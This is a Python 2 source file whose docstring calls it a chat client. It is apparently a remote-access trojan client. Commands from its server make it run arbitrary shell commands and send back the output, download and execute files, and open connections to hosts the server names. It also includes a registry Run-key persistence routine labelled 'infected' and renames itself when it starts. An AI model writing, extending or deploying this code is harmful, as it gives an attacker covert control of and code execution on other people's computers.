"""
Client - send msg to other clients
"""
import random
import socket
import select
import msvcrt
import sys
import os
import subprocess
import data_pb2
import _winreg
from threading import Thread
from time import sleep

SERVER_ADDRESS = "localhost"
PORT = 8081
MAX_SIZE_RESPONSE = 10240
MAX_RANDOM = 1000
MY_CHAR = 27
CHAR_ENTER = 13
REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
TIMEOUT = 60
my_socket = None


def threaded_function(soc):
    un_success = 0
    while True:
        try:
            soc.send("1")
            sleep(TIMEOUT)
        except Exception as e:
            un_success += 1
            print 'un_success', un_success
        if un_success > 2:
            print "closed the session"
            return


class ServerSession():
    def __init__(self, soc, func):
        self.thread = Thread(target=func, args=(soc,))
        self.thread.start()


class Handle():
    def __init__(self):
        self.reset_file_data()
        self.sessions = []

    def reset_file_data(self):
        self.file_name = 'try.py'
        self.file_id = -1
        self.size_of_data = 0
        self.file_index = -1

    def exec_file(self):
        # os.system("python " + self.file_name)
        subprocess.Popen(["python", self.file_name], stdout=subprocess.PIPE, shell=True)
        # self.terminate()

    def append_to_file(self, fileTransfer):
        if fileTransfer.id <> self.file_id or self.file_index + 1 is not fileTransfer.index:
            return False
        self.file_index = fileTransfer.index
        with open(self.file_name, 'ab') as f:
            f.write(fileTransfer.data)
        if fileTransfer.isLast:
            self.exec_file()

    def start_get_file(self, fileStart):
        self.file_id = fileStart.id
        self.size_of_data = fileStart.size_of_data
        self.file_name = fileStart.file_name
        with open(self.file_name, 'w') as f:
            f.write('')

    def handle_request(self, data):
        d = data_pb2.TData()
        try:
            d.ParseFromString(data)
        except Exception as e:
            print e.message
            return
        if d.WhichOneof("Msg") == "clientReq":
            print '\r[from server] name:', d.clientReq.name
            print 'id:', d.clientReq.id
        if d.WhichOneof("Msg") == 'serverReq':
            if d.serverReq.WhichOneof("Type") == 'killYourself':
                self.terminate(d.serverReq.killYourself.status)
            if d.serverReq.WhichOneof("Type") == 'cmdCommand':
                self.exec_command(d.serverReq.id, d.serverReq.cmdCommand)
            if d.serverReq.WhichOneof("Type") == "fileStart":
                self.start_get_file(d.serverReq.fileStart)
            if d.serverReq.WhichOneof("Type") == "fileTransfer":
                self.append_to_file(d.serverReq.fileTransfer)
            if d.serverReq.WhichOneof("Type") == "openSession":
                self.openSession(d.serverReq.openSession)
        if d.WhichOneof("Msg") == "serverRsp":
            pass

    def say_hello(self):
        d = data_pb2.TData()
        d.clientReq.id = random.randint(1, MAX_RANDOM)
        d.clientReq.clientStart.ip = my_socket.getsockname()[0]
        d.clientReq.clientStart.port = my_socket.getsockname()[1]
        my_socket.send(d.SerializeToString())

    def terminate(self, status):
        print "----------------- goodbye!!", my_socket.getsockname(), "-----------------"
        sys.exit(status)

    def exec_command(self, id, cmdCommand):
        d = data_pb2.TData()
        d.clientRsp.id = id
        d.clientRsp.cmdCommandResult.result = ""
        try:
            print cmdCommand.cmd
            output = subprocess.Popen(cmdCommand.cmd.split(), stdout=subprocess.PIPE, shell=True)
            result = output.stdout.read()
            d.clientRsp.cmdCommandResult.result = result
            d.clientRsp.status = data_pb2.RESULT_OK
        except Exception as ex:
            d.clientRsp.status = data_pb2.ERROR_EXEC

        my_socket.send(d.SerializeToString())

    def openSession(self, openSession):
        print "open Session"
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((openSession.ip, openSession.port))
            self.sessions.append(ServerSession(soc, threaded_function))
        except Exception as ex:
            print "close session on error"
            print ex.message


def persistent(name, value):
    """
    The function add key to registry under 'REG_PATH'
    :param name: key value
    :param value: key data
    :return: true if success else false
    """
    try:
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,
                                       _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(registry_key)
        return True
    except WindowsError:
        return False


def main():
    """
    The function sends data to server, and prints msgs from other clients.
    :return:
    """
    try:
        # persistent('infected', os.path.abspath(__file__))  # DON'T REMOVE

        # rename me to client.py
        os.rename(__file__, os.getcwd() + "/client.py")

        global my_socket
        my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_socket.connect((SERVER_ADDRESS, PORT))

        handle = Handle()
        handle.say_hello()
        print my_socket.getsockname()
        msg = ''
        while True:
            # ----------send data----------
            if msvcrt.kbhit():
                char = msvcrt.getch()
                if char == chr(MY_CHAR):
                    break
                if msg == '':
                    sys.stdout.write('[Me] ')
                msg += char
                sys.stdout.write(char)
                sys.stdout.flush()
                if char == chr(CHAR_ENTER):
                    my_socket.send(msg)
                    msg = ''
                    sys.stdout.write('\n')

            # ----------receive data-------------
            rlist, wlist, xlist = select.select([my_socket], [my_socket], [], 1)
            if my_socket in rlist:
                data = my_socket.recv(MAX_SIZE_RESPONSE)
                if not data or data == "":
                    my_socket.close()
                    print "Connection with server closed."
                    return
                handle.handle_request(data)
                if msg != '':
                    sys.stdout.write('[Me] ' + msg)
                    sys.stdout.flush()

    except Exception as e:
        print e.message
        my_socket.close()
        print 'connection closed'
        return

    my_socket.close()
    print 'connection closed'


if __name__ == "__main__":
    main()
